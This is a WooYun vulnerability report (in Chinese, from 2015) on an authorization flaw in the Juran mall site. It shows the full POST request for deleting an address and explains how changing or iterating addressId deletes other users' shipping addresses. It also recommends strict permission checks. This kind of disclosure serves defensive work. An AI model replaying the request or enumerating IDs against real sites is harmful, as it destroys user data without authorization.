{"id": 78285, "wybug_id": "wooyun-2015-0160777", "wybug_title": "居然之家存在设计缺陷导致可越权删除线上百万用户收货地址", "wybug_corp": "居然之家", "wybug_author": "路人甲", "wybug_date": "2015-12-17 21:56", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 北京居然之家投资控股集团有限公司，成立于1999年3月份，是由全国华联商厦联合有限责任公司、北京中天基业投资管理有限公司等33位股东共同投资设立的大型国有控股股份制企业，注册资本8100万元人民币。存在问题的业务:http://mall.juran.cn存在问题的链接：http://mall.juran.cn/myspace/userinfo/taddresses.htm在删除用户的收货地址时，没有校验权限，导致可越权批量删除线上百万收货地址 详细说明：  0X00收货地址管理（这个界面得先下单的时候填写默认收货地址才会出现）http://mall.juran.cn/myspace/userinfo/taddresses.htm\n\n0X01点击删除图标，截取删除的收货地址的接口POST /myspace/userinfo/delete_trade_address.htm HTTP/1.1Host: mall.juran.cnContent-Length: 32Accept: */*Origin: http://mall.juran.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://mall.juran.cn/myspace/userinfo/taddresses.htmAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: XXXXXXXXaddressId=1088503&userId=1134073\n\n0x02 遍历addressId即可删除所有用户的地址0X03 我用了两个账户做测试（自己注册的）账户A截图：\n\n账户B截图：\n\n0X04此时点击账户A的收货地址删除图标，拦截请求POST /myspace/userinfo/delete_trade_address.htm HTTP/1.1Host: mall.juran.cnContent-Length: 32Accept: */*Origin: http://mall.juran.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://mall.juran.cn/myspace/userinfo/taddresses.htmAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: XXXXXXXXaddressId=1088502&userId=1134073\n\n0X05 将addressId=1088502改为账户B的addressId=1088503，放行。我们刷新下账户B的页面，发现收货地址被删除，证明此处存在越权\n\n\n\n   漏洞证明：  0X05 将addressId=1088502改为账户B的addressId=1088503，放行。我们刷新下账户B的页面，发现收货地址被删除，证明此处存在越权\n\n\n\n   修复方案：  严格校验权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}